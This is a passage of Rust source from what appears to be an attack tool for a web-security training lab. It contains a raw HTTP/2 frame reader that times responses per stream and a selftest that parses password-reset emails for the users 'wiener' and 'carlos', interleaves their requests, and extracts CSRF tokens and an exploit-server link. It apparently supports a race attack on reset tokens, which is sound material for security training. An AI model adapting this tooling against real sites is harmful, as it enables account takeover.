        let sid = u32::from_be_bytes([hdr[5] & 0x7f, hdr[6], hdr[7], hdr[8]]);
        let mut payload = vec![0u8; len];
        if len > 0 {
            if tokio::time::timeout(idle, stream.read_exact(&mut payload)).await.is_err() {
                break;
            }
        }
        raw.extend_from_slice(&hdr);
        raw.extend_from_slice(&payload);
        match ftype {
            4 => {
                if flags & 0x1 == 0 {
                    let _ = stream.write_all(&frame(4, 0x1, 0, &[])).await;
                    let _ = stream.flush().await;
                }
            }
            6 => {
                if flags & 0x1 == 0 {
                    let _ = stream.write_all(&frame(6, 0x1, 0, &payload)).await;
                    let _ = stream.flush().await;
                }
            }
            1 | 9 => {
                let entry = pending_headers.entry(sid).or_insert_with(|| (Vec::new(), false));
                entry.0.extend_from_slice(&payload);
                if flags & 0x4 != 0 {
                    entry.1 = true;
                }
                if entry.1 {
                    let block = entry.0.clone();
                    pending_headers.remove(&sid);
                    let headers = decoder.decode(&block).unwrap_or_default();
                    let status = headers
                        .iter()
                        .find(|(n, _)| n == b":status")
                        .map(|(_, v)| String::from_utf8_lossy(v).to_string());
                    let row = by_stream.entry(sid).or_insert_with(|| json!({"stream": sid, "body": ""}));
                    row["status"] = json!(status);
                    if row.get("t_us").is_none() {
                        row["t_us"] = json!(wrote_at.elapsed().as_micros() as u64);
                    }
                    if flags & 0x1 != 0 {
                        row["end_stream"] = json!(true);
                    }
                }
            }
            0 => {
                let row = by_stream.entry(sid).or_insert_with(|| json!({"stream": sid, "body": ""}));
                let prev = row["body"].as_str().unwrap_or("").to_string();
                let mut next = prev;
                next.push_str(&String::from_utf8_lossy(&payload));
                row["body"] = json!(next);
                if flags & 0x1 != 0 {
                    row["end_stream"] = json!(true);
                }
            }
            3 => {
                let row = by_stream.entry(sid).or_insert_with(|| json!({"stream": sid}));
                row["rst_stream"] = json!(true);
            }
            7 => {
                let row = by_stream.entry(0).or_insert_with(|| json!({"stream": 0}));
                row["goaway"] = json!(true);
            }
            _ => {}
        }
        if !want.is_empty()
            && want.iter().all(|s| {
                by_stream
                    .get(s)
                    .and_then(|v| v.get("end_stream"))
                    .and_then(Value::as_bool)
                    .unwrap_or(false)
            })
        {
            break;
        }
    }
    Ok((by_stream, raw))
}

fn selftest() {
    let html = "<tr><td>2026-10-12 13:32:00 +0000</td><td>wiener@x</td><td>no-reply@y</td><td>Account recovery</td><td><pre>Hello!\n\n<a href='https://lab/forgot-password?user=wiener&token=69af847f52ec6d6d161f94ba5984027c1feb170a' target=_blank>https://lab/forgot-password?user=wiener&amp;token=69af847f52ec6d6d161f94ba5984027c1feb170a</a></pre></td><td><a target=_blank href='?raw=0'>View raw</a></td></tr><tr><td>2026-10-12 13:30:00 +0000</td><td>wiener@x</td><td>no-reply@y</td><td>Account recovery</td><td><pre><a href='https://lab/forgot-password?user=carlos&token=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' target=_blank>x</a></pre></td></tr>";
    let mails = parse_mails(html);
    assert_eq!(mails.len(), 2, "{mails:?}");
    assert_eq!(mails[0].1, "wiener");
    assert_eq!(mails[0].2, "69af847f52ec6d6d161f94ba5984027c1feb170a");
    assert_eq!(mails[0].0, "2026-10-12 13:32:00");
    assert_eq!(mails[1].1, "carlos");
    let l = expand_layout("WWCWW", "wiener", "carlos");
    assert_eq!(l, vec!["wiener", "wiener", "carlos", "wiener", "wiener"]);
    let csrf_page = "<input required type=\"hidden\" name=\"csrf\" value=\"qXFBkqER02GS6jWmHFfvhsnMNpWnGJzA\">";
    assert_eq!(extract_csrf(csrf_page).unwrap(), "qXFBkqER02GS6jWmHFfvhsnMNpWnGJzA");
    let inbox_page = "<a id='exploit-link' class='button' target='_blank' href='https://exploit-0a4d00a90449e89d819d858201bd0067.exploit-server.net/email'>Email client</a>";
    assert_eq!(
        extract_inbox(inbox_page).unwrap(),
        "https://exploit-0a4d00a90449e89d819d858201bd0067.exploit-server.net/email"
    );
    assert_eq!(frame(1, 0x5, 1, b"x").len(), 10);
    pi_rust_lib::report::success(
        "ts7_align",
        json!({"selftest": "ok", "checks": ["mail-parse", "layout", "csrf", "inbox-link", "frame"]}),
        "run: ts7_align https://lab/ --jar /tmp/j.json --rounds 40",
    )
    .expect("report");
}
